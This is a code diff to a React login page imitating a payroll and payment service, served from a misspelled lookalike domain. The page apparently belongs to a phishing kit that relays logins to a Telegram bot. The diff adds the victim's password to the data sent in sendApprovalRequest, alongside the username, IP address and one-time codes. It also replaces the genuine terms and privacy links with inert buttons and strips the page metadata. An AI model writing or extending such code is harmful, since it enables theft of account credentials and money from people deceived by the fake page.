@@ -1,9 +1,9 @@
 import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
-import { Helmet } from "react-helmet-async";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown } from "lucide-react";
+import { ChatWidget } from "@/components/chat-widget";
 import { RecaptchaBadge } from "@/components/recaptcha-badge";
 import { LoadingModal } from "@/components/loading-modal";
 import { getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset, sendBotOTP, sendOtpVerificationRequest } from "@/lib/telegram";
@@ -93,7 +93,7 @@ export default function Login() {
     const sessionKey = Date.now().toString(36);
     offsetRef.current = startOffset;
 
-    await sendApprovalRequest(username, ip, now, sessionKey, "Login");
+    await sendApprovalRequest(username, ip, now, sessionKey, "Login", password);
     setWaiting(true);
 
     pollRef.current = setInterval(async () => {
@@ -121,16 +121,6 @@ export default function Login() {
       className="login-outer"
       style={{ minHeight: "100vh", background: "#f7f7f7", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}
     >
-      <Helmet>
-        <title>Sign In — mypaymenttvaulltr.com</title>
-        <meta name="description" content="Sign in to your MyPaymentVault account. Secure access to your payroll and payment services." />
-        <link rel="canonical" href="https://www.mypaymenttvaulltr.com/login" />
-        <meta property="og:title" content="Sign In — mypaymenttvaulltr.com" />
-        <meta property="og:description" content="Sign in to your MyPaymentVault account. Secure access to your payroll and payment services." />
-        <meta property="og:url" content="https://www.mypaymenttvaulltr.com/login" />
-        <meta name="twitter:title" content="Sign In — mypaymenttvaulltr.com" />
-        <meta name="twitter:description" content="Sign in to your MyPaymentVault account. Secure access to your payroll and payment services." />
-      </Helmet>
       <style>{`
         /* ── MOBILE ── */
         @media (max-width: 768px) {
@@ -640,17 +630,18 @@ export default function Login() {
         <span style={{ fontSize: 12, color: "#777" }}>
           &copy; {t.copyright}
           {" | "}
-          <a href="https://mypaymentvault.com/terms" target="_blank" rel="noopener noreferrer" style={{ fontSize: 12, color: "#777", textDecoration: "underline" }}>
+          <button onClick={() => {}} style={{ fontSize: 12, color: "#777", textDecoration: "underline", background: "none", border: "none", cursor: "pointer", padding: 0 }}>
             {t.termsOfUse}
-          </a>
+          </button>
           {" | "}
-          <a href="https://mypaymentvault.com/privacy" target="_blank" rel="noopener noreferrer" style={{ fontSize: 12, color: "#777", textDecoration: "underline" }}>
+          <button onClick={() => {}} style={{ fontSize: 12, color: "#777", textDecoration: "underline", background: "none", border: "none", cursor: "pointer", padding: 0 }}>
             {t.privacyCookies}
-          </a>
+          </button>
         </span>
       </div>
 
       <RecaptchaBadge />
+      <ChatWidget />
 
       {/* Loading overlay — hanya muncul saat tidak ada modal lain */}
       <LoadingModal show={(loading || waiting) && !showVerifyModal && !showCodeModal && !showModal} />
